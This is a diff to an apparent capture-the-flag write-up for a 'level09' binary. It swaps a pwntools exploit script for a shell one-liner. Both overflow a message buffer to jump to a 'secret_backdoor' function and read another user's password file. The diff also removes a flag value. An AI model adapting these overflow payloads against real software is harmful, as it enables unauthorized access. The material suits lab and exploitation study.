@@ -107,29 +107,5 @@ After `handle_msg` returns into `secret_backdoor`, it calls
 cat /home/users/end/.pass
 ```
 
-## One-liner (Python / pwntools)
-
-```python
-from pwn import ssh, p64
-
-PIE_BASE = 0x555555554000
-BACKDOOR = PIE_BASE + 0x88c
-
-s = ssh(host="localhost", port=4242, user="level09", password="<pass>")
-p = s.run("/home/users/level09/level09")
-
-p.recvuntil(b">>: ")
-p.sendline(b"A" * 40 + b"\xff")          # inflate msg_len to 255
-
-p.recvuntil(b">>: ")
-payload = b"A" * 0xc0 + b"B" * 8 + p64(BACKDOOR)
-p.sendline(payload)                       # overflow return address
-
-p.recvuntil(b"Msg sent!")
-p.sendline(b"cat /home/users/end/.pass")  # system() runs this
-print(p.recvrepeat(timeout=3))
-```
-
-## Flag
-
-`j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
+## One-liner
+(python -c 'import sys; sys.stdout.write("A"*40+"\xff\n")'; python -c 'import sys; sys.stdout.write("A"*192+"B"*8+"\x8c\x48\x55\x55\x55\x55\x00\x00\n")'; echo 'cat /home/users/end/.pass') | /home/users/level09/level09
